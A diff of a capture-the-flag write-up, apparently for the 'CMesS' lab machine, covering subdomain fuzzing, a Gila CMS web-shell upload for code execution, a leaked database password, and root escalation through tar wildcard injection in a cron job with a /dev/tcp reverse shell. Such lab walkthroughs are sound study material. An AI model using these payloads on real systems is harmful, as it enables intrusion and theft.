@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -34,29 +34,29 @@ Let's fuzz for subdomains and directories:
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.42.25 -H "Host: FUZZ.cmess.thm" -mc 200,301,302 -fw 522 -t 100 -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.42.25
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.cmess.thm
+ :: Method : GET
+ :: URL : http://10.10.42.25
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header : Host: FUZZ.cmess.thm
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200,301,302
- :: Filter           : Response words: 522
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 100
+ :: Matcher : Response status: 200,301,302
+ :: Filter : Response words: 522
 ________________________________________________
 
-dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 873ms]
+dev [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 873ms]
 ```
 
 We found a `dev.cmess.thm` subdomain, let's add it to `/etc/hosts` and take a look:
@@ -92,7 +92,7 @@ We got `Authenticated RCE`, this may be our way, let's proceed with exploitation
 # EXPLOITATION
 ---
 
-The vulnerability in Gila CMS 1.10.9 allows authenticated attackers to execute arbitrary code on the target server by exploiting insufficient file validation in the file manager. After logging in with valid admin credentials, an attacker can upload a malicious PHP file (e.g.,Â `shell.php7`) to theÂ `tmp/`Â directory via theÂ `/fm/upload`Â endpoint. The CMS does not properly restrict file types, enabling the upload of a web shell containingÂ `<?php system($_GET["cmd"]);?>`, which executes OS commands via theÂ `cmd`Â parameter.
+The vulnerability in Gila CMS 1.10.9 allows authenticated attackers to execute arbitrary code on the target server by exploiting insufficient file validation in the file manager. After logging in with valid admin credentials, an attacker can upload a malicious PHP file (e.g.,`shell.php7`) to the`tmp/` directory via the`/fm/upload` endpoint. The CMS does not properly restrict file types, enabling the upload of a web shell containing`<?php system($_GET["cmd"]);?>`, which executes OS commands via the`cmd` parameter.
 
 
 Exploit: https://www.exploit-db.com/exploits/51569
@@ -134,38 +134,38 @@ www-data@cmess:/var/www/html$ cat config.php
 <?php
 
 $GLOBALS['config'] = array (
-  'db' =>
-  array (
-    'host' => 'localhost',
-    'user' => 'root',
-    'pass' => 'r0otus3rpassw0rd',
-    'name' => 'gila',
-  ),
-  'permissions' =>
-  array (
-    1 =>
-    array (
-      0 => 'admin',
-      1 => 'admin_user',
-      2 => 'admin_userrole',
-    ),
-  ),
-  'packages' =>
-  array (
-    0 => 'blog',
-  ),
-  'base' => 'http://cmess.thm/gila/',
-  'theme' => 'gila-blog',
-  'title' => 'Gila CMS',
-  'slogan' => 'An awesome website!',
-  'default-controller' => 'blog',
-  'timezone' => 'America/Mexico_City',
-  'ssl' => '',
-  'env' => 'pro',
-  'check4updates' => 1,
-  'language' => 'en',
-  'admin_email' => 'andre@cmess.thm',
-  'rewrite' => true,
+ 'db' =>
+ array (
+ 'host' => 'localhost',
+ 'user' => 'root',
+ 'pass' => 'r0otus3rpassw0rd',
+ 'name' => 'gila',
+ ),
+ 'permissions' =>
+ array (
+ 1 =>
+ array (
+ 0 => 'admin',
+ 1 => 'admin_user',
+ 2 => 'admin_userrole',
+ ),
+ ),
+ 'packages' =>
+ array (
+ 0 => 'blog',
+ ),
+ 'base' => 'http://cmess.thm/gila/',
+ 'theme' => 'gila-blog',
+ 'title' => 'Gila CMS',
+ 'slogan' => 'An awesome website!',
+ 'default-controller' => 'blog',
+ 'timezone' => 'America/Mexico_City',
+ 'ssl' => '',
+ 'env' => 'pro',
+ 'check4updates' => 1,
+ 'language' => 'en',
+ 'admin_email' => 'andre@cmess.thm',
+ 'rewrite' => true,
 );
 ```
 
@@ -174,17 +174,17 @@ I tried this credentials for `andre` at ssh, but no luck, let's keep searching t
 ```bash
 www-data@cmess:/tmp$ ls -la
 total 40
-drwxrwxrwt  9 root     root     4096 Apr 28 12:34 .
-drwxr-xr-x 22 root     root     4096 Feb  6  2020 ..
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 .ICE-unix
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 .Test-unix
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 .X11-unix
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 .XIM-unix
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 .font-unix
-drwxrwxrwt  2 root     root     4096 Apr 28 12:04 VMwareDnD
--rw-r--r--  1 root     root      161 Apr 28 12:34 andre_backup.tar.gz
-prw-r--r--  1 www-data www-data    0 Apr 28 12:34 f
-drwx------  3 root     root     4096 Apr 28 12:04 systemd-private-6033f99b25c2444da8095121db6b89ec-systemd-timesyncd.service-owkn4D
+drwxrwxrwt 9 root root 4096 Apr 28 12:34 .
+drwxr-xr-x 22 root root 4096 Feb 6 2020 ..
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 .ICE-unix
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 .Test-unix
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 .X11-unix
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 .XIM-unix
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 .font-unix
+drwxrwxrwt 2 root root 4096 Apr 28 12:04 VMwareDnD
+-rw-r--r-- 1 root root 161 Apr 28 12:34 andre_backup.tar.gz
+prw-r--r-- 1 www-data www-data 0 Apr 28 12:34 f
+drwx------ 3 root root 4096 Apr 28 12:04 systemd-private-6033f99b25c2444da8095121db6b89ec-systemd-timesyncd.service-owkn4D
 ```
 
 There is a `andre_backup.tar.gz` file, let's get it in our machine to check if it got some credentials in it:
@@ -230,7 +230,7 @@ If we use linpeas again, we can notice this:
 ![Pasted image 20250428152151.png](../../IMAGES/Pasted%20image%2020250428152151.png)
 
 ```
-*/2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+*/2 * * * * root cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
 ```
 
 We got a cronjob which runs each 2 minutes, visualizing the format of this, we can notice it is vulnerable to `wildcard injection`, let's do the following in order to get a root shell:
@@ -245,13 +245,13 @@ bash -c 'bash -i >& /dev/tcp/10.6.34.159/9001 0>&1'
 2. Craft the malicious `filenames` to get RCE:
 
 ```
-echo "" > "--checkpoint=1"       
+echo "" > "--checkpoint=1" 
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 chmod +x shell.sh
 ```
 
-- `--checkpoint=1`: ForcesÂ `tar`Â to trigger a checkpoint
-- `--checkpoint-action=exec=...`: ExecutesÂ `shell.sh`Â when the checkpoint is reached.
+- `--checkpoint=1`: Forces`tar` to trigger a checkpoint
+- `--checkpoint-action=exec=...`: Executes`shell.sh` when the checkpoint is reached.
 
 3. Start our listener and wait for the shell:
 
